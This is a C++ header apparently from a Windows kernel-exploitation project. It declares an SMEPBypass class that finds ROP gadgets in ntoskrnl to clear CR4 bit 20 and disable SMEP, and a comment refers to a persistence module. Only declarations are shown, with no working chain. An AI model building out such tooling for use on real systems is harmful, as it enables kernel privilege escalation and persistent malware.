#pragma once

#include "Utils.h"
#include <vector>
#include <memory>
#include <iostream>
#include <iomanip>
#include "Providers/IProvider.h"

namespace KernelMode {
    
    // Structure for common ROP gadgets
    struct RopGadgets {
        uintptr_t PopRcxRet;        // pop rcx; ret
        uintptr_t MovCr4RcxRet;     // mov cr4, rcx; ret (or similar sequence)
        uintptr_t PopRaxRet;        // pop rax; ret
        uintptr_t MovCr4RaxRet;     // mov cr4, rax; ret
        bool Found;
    };

    class SMEPBypass {
    public:
        explicit SMEPBypass(std::shared_ptr<Providers::IProvider> provider);
        
        // Find necessary gadgets in ntoskrnl
        bool Initialize();
        
        // Disable SMEP (CR4 bit 20) using ROP chain
        // Note: This requires the ability to execute a ROP chain, usually via stack pivot or hook.
        // For Persistence.cpp, we might need a specific strategy.
        bool DisableSMEP();
        
        // Restore SMEP
        bool EnableSMEP();

        // Get the found gadgets
        const RopGadgets& GetGadgets() const { return gadgets; }

    private:
        std::shared_ptr<Providers::IProvider> provider;
        RopGadgets gadgets;
        uintptr_t ntoskrnlBase;
        uintptr_t originalCr4;
        
        uintptr_t FindGadget(const std::vector<uint8_t>& pattern, const std::string& mask);
    };
}
